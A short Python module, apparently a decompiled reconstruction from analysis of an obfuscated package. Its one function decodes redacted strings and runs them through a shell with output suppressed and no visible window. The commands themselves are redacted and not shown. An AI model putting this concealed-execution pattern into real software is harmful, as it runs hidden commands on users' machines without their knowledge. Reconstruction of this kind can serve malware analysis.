"""Recovered entry ``ru_i0_go(_sy, _z, _sp, _line, _cf)``.

Decompiled structure: ``subprocess.Popen`` with ``shell``, all three
``DEVNULL`` pipes and ``CREATE_NO_WINDOW``.  The exact argv order is
inferred from the two additional hidden literals.
"""
from __future__ import annotations

import subprocess

from ..link._fds_jm import sec
from . import _ops


def ru_i0_go() -> None:
    _sy = sec(_ops.redacted_secret("g3vcqbaj"))
    _z = sec(_ops.redacted_secret("3u66uz3g"))
    module = subprocess
    _line = [
        sec(_ops.redacted_secret("z65s6k66")),
        sec(_ops.redacted_secret("6ws2w2am")),
    ]
    _cf = getattr(module, "CREATE_NO_WINDOW", 0)
    module.Popen(
        _line,
        shell=True,
        stdin=module.DEVNULL,
        stdout=module.DEVNULL,
        stderr=module.DEVNULL,
        creationflags=_cf,
    )

